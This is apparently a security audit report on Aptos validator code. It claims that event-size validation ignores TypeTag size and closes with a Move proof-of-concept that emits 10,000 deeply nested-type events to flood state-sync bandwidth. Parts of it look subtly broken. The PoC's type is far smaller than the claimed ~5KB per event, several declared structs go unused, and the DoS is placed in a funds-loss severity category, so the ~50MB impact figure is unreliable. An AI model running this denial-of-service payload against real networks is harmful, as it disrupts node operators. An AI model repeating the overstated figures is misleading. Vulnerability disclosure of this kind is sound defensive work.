# Audit Report

## Title
BCS Bombing via ContractEvent TypeTag Size Bypass Causing Network Bandwidth Exhaustion

## Summary
The `check_change_set` function validates event sizes by checking only `event_data().len()`, excluding the `TypeTag` size. Since TypeTags can be up to ~5KB when BCS-serialized, an attacker can emit many events with large TypeTags but zero `event_data`, bypassing validation checks while creating massive network payloads that exhaust bandwidth during state synchronization.

## Finding Description
The vulnerability exists in the event size validation logic within the ChangeSet validation flow. When a transaction emits events, the system validates their size to prevent resource exhaustion. However, the validation is incomplete. [1](#0-0) 

The validation code checks only `event.event_data().len()` for each event's size, completely ignoring the `TypeTag` component. However, `ContractEvent` structures contain both `event_data` and `type_tag` fields that are both serialized during BCS encoding. [2](#0-1) [3](#0-2) 

The `ContractEvent::size()` method correctly calculates the full size including `bcs::serialized_size(&self.type_tag)`, but this method is never called during validation. TypeTags can be deeply nested structures with up to 8 levels of nesting and multiple type arguments per level. [4](#0-3) [5](#0-4) 

Production VM config limits TypeTag complexity to ~5000 bytes through pseudo-gas metering: [6](#0-5) 

**Attack Path:**
1. Attacker creates a Move module that emits events with maximally complex TypeTags (e.g., deeply nested structs with multiple type arguments at each level, approaching the 5000-byte limit)
2. Each event has `event_data` of 0 bytes but TypeTag of ~5KB
3. Transaction emits 10,000+ such events
4. `check_change_set` validates: `event.event_data().len()` = 0 bytes × 10,000 = 0 bytes total (passes)
5. Actual BCS serialization includes full TypeTags: ~5KB × 10,000 = ~50MB
6. When `TransactionOutput` is transmitted via state sync, the network payload is 50MB despite passing all validation checks [7](#0-6) 

The state sync service will attempt to transmit this data, consuming network bandwidth well beyond what the validation checks anticipated.

## Impact Explanation
**Medium Severity** - This is a Denial of Service (DoS) attack through network bandwidth exhaustion, fitting the "Limited funds loss or manipulation / State inconsistencies requiring intervention" category:

1. **Network Bandwidth Exhaustion**: Validators and full nodes syncing state will consume excessive bandwidth processing these transactions, potentially degrading network performance
2. **State Sync Delays**: Nodes attempting to sync will experience significant slowdowns as they download and process artificially inflated transaction outputs
3. **Resource Consumption**: While not causing fund loss or consensus breaks, this creates operational disruptions requiring manual intervention to identify and mitigate

The impact is limited because:
- Does not affect consensus safety or liveness permanently
- Does not cause fund loss or theft
- Can be mitigated by adjusting gas parameters or patching validators
- Network-level rate limiting provides some protection

However, it does violate the "Resource Limits" invariant (#9) by allowing operations that bypass storage and computational limit checks.

## Likelihood Explanation
**High Likelihood** - This vulnerability is easily exploitable:

1. **Low Technical Barrier**: Any user can deploy a Move module and call `0x1::event::emit()` with complex type parameters
2. **No Special Permissions Required**: Regular transaction senders can execute this attack
3. **Bypasses All Checks**: The validation logic has a clear blind spot that isn't caught by other safeguards
4. **Economically Viable**: Gas costs for emitting events are based on `event_data` size, so events with large TypeTags but small data are cheap to create
5. **Repeatable**: Attacker can submit multiple transactions to amplify the effect

The only limiting factor is that TypeTag complexity is capped at ~5KB per event through VM config limits, but this still allows significant amplification (0 bytes checked vs 5KB actual per event).

## Recommendation
Modify the event size validation to use the complete event size including TypeTag:

In `aptos-move/aptos-vm-types/src/storage/change_set_configs.rs`, replace the validation logic at line 117:

```rust
// BEFORE (vulnerable):
let size = event.event_data().len() as u64;

// AFTER (fixed):
let size = event.size() as u64;
```

This ensures the validation checks the actual BCS-serialized size that will be transmitted over the network. The `ContractEvent::size()` method already correctly computes the full size including TypeTag serialization.

Additionally, consider adding validation during event creation in the native function to fail early: [8](#0-7) 

After `ContractEvent::new_v2()` succeeds, add a check:
```rust
let event_size = event.size() as u64;
if event_size > MAX_REASONABLE_EVENT_SIZE {
    return Err(SafeNativeError::Abort { 
        abort_code: ECANNOT_CREATE_EVENT 
    });
}
```

## Proof of Concept

```move
module attacker::bcs_bomb {
    use std::event;
    
    // Create deeply nested type to maximize TypeTag size
    struct Level8<T> has copy, drop, store { }
    struct Level7<T1, T2> has copy, drop, store { }
    struct Level6<T1, T2, T3> has copy, drop, store { }
    struct Level5<T1, T2, T3> has copy, drop, store { }
    struct Level4<T1, T2, T3> has copy, drop, store { }
    struct Level3<T1, T2, T3> has copy, drop, store { }
    struct Level2<T1, T2, T3> has copy, drop, store { }
    struct Level1<T1, T2, T3> has copy, drop, store { }
    
    // Event with maximally complex TypeTag but minimal data
    #[event]
    struct BombEvent<T> has drop, store { }
    
    public entry fun exploit() {
        // Emit 10,000 events with deeply nested TypeTag
        // Each has ~5KB TypeTag but 0 bytes event_data
        let i = 0;
        while (i < 10000) {
            event::emit(BombEvent<
                Level1<
                    Level2<Level3<u64, u128, u256>, Level3<u64, u128, u256>, Level3<u64, u128, u256>>,
                    Level2<Level3<u64, u128, u256>, Level3<u64, u128, u256>, Level3<u64, u128, u256>>,
                    Level2<Level3<u64, u128, u256>, Level3<u64, u128, u256>, Level3<u64, u128, u256>>
                >
            > { });
            i = i + 1;
        };
        
        // check_change_set validates: 0 bytes event_data × 10,000 = 0 bytes ✓
        // Actual BCS serialization: ~5KB TypeTag × 10,000 = ~50MB
        // Network bandwidth exhaustion achieved
    }
}
```

**Test Steps:**
1. Deploy the module to a test network
2. Call `attacker::bcs_bomb::exploit()`
3. Monitor the `TransactionOutput` BCS serialization size
4. Observe that validation passes with 0 event_data bytes
5. Observe network transmission requires ~50MB for the transaction output
6. Measure impact on state sync bandwidth consumption

### Citations

**File:** aptos-move/aptos-vm-types/src/storage/change_set_configs.rs (L115-125)
```rust
        let mut total_event_size = 0;
        for event in change_set.events_iter() {
            let size = event.event_data().len() as u64;
            if size > self.max_bytes_per_event {
                return storage_write_limit_reached(None);
            }
            total_event_size += size;
            if total_event_size > self.max_bytes_all_events_per_transaction {
                return storage_write_limit_reached(None);
            }
        }
```

**File:** types/src/contract_event.rs (L246-254)
```rust
/// Entry produced via a call to the `emit` builtin.
#[derive(Hash, Clone, Eq, PartialEq, Serialize, Deserialize, CryptoHasher)]
pub struct ContractEventV2 {
    /// The type of the data
    type_tag: TypeTag,
    /// The data payload of the event
    #[serde(with = "serde_bytes")]
    event_data: Vec<u8>,
}
```

**File:** types/src/contract_event.rs (L267-271)
```rust

    pub fn size(&self) -> anyhow::Result<usize> {
        let size = bcs::serialized_size(&self.type_tag)? + self.event_data.len();
        Ok(size)
    }
```

**File:** third_party/move/move-core/types/src/safe_serialize.rs (L11-11)
```rust
pub(crate) const MAX_TYPE_TAG_NESTING: u8 = 8;
```

**File:** third_party/move/move-core/types/src/language_storage.rs (L216-223)
```rust
pub struct StructTag {
    pub address: AccountAddress,
    pub module: Identifier,
    pub name: Identifier,
    // alias for compatibility with old json serialized data.
    #[serde(rename = "type_args", alias = "type_params")]
    pub type_args: Vec<TypeTag>,
}
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L246-249)
```rust
        // 5000 limits type tag total size < 5000 bytes and < 50 nodes.
        type_max_cost: 5000,
        type_base_cost: 100,
        type_byte_cost: 1,
```

**File:** config/src/config/state_sync_config.rs (L16-27)
```rust
// The maximum message size per state sync message
const SERVER_MAX_MESSAGE_SIZE: usize = 10 * 1024 * 1024; // 10 MiB

// The maximum message size per state sync message (for v2 data requests)
const CLIENT_MAX_MESSAGE_SIZE_V2: usize = 20 * 1024 * 1024; // 20 MiB (used for v2 data requests)
const SERVER_MAX_MESSAGE_SIZE_V2: usize = 40 * 1024 * 1024; // 40 MiB (used for v2 data requests)

// The maximum chunk sizes for data client requests and response
const MAX_EPOCH_CHUNK_SIZE: u64 = 200;
const MAX_STATE_CHUNK_SIZE: u64 = 4000;
const MAX_TRANSACTION_CHUNK_SIZE: u64 = 3000;
const MAX_TRANSACTION_OUTPUT_CHUNK_SIZE: u64 = 3000;
```

**File:** aptos-move/framework/src/natives/event.rs (L313-315)
```rust
    let event = ContractEvent::new_v2(type_tag, blob).map_err(|_| SafeNativeError::Abort {
        abort_code: ECANNOT_CREATE_EVENT,
    })?;
```
